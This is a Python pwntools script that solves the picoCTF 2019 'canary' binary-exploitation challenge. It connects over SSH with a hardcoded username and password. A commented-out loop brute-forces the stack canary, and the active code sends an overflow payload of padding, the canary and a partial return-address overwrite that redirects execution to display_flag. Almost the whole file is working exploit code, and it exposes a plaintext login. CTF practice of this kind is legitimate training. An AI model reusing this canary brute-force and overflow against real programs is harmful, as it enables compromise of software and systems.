from pwn import *
# brute force to find the canary byte by byte in the local environment
s = ssh(host="2019shell1.picoctf.com", user="Hohenheim10", password="mhw1015sz15,.")
s.set_working_directory(wd=b"/problems/canary_4_221260def5087dde9326fb0649b434a7")
numbers = "1234567890"
lower_letters = "abcdefghijklmnopqrstuvwxyz"
upper_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
chars = upper_letters+lower_letters+numbers
canary = ""

# buf_size = 32
# entry_length = 33
# while entry_length<= 36:
#     for c in chars:
#         p = s.process("./vuln")
#         p.sendlineafter("Please enter the length of the entry:\n> ", str(entry_length))
#         p.sendlineafter("Input> ", "A" * 32 + canary + c)
#         print("probing "+str(len(canary))+"-th char of the canary")
#         print("c: "+c)
#         res = p.recvline()
#         print(res)
#         if b"Ok... Now Where's the Flag?" in res:
#             canary += c
#             entry_length += 1
#             p.close()
#             break
#         p.close()
# print("canary: "+canary) # The canary is LjgH

canary = "LjgH"
e = ELF('./vuln_task7')
flag_address = p16(e.symbols['display_flag']) # integer to bytes
padding = "A"*16
while True:
    p = s.process("./vuln")
    payload = b"A" * 32 + canary.encode("utf-8") + padding.encode("utf-8") + flag_address
    p.sendlineafter("Please enter the length of the entry:\n> ", str(len(payload)))
    p.sendlineafter("Input> ", payload)
    all = p.recvall()
    # print(all)
    if b"picoCTF" in all:
        flag = all.decode("utf-8").split("{")[1].split("}")[0]
        print(flag)
        break;
    p.close()
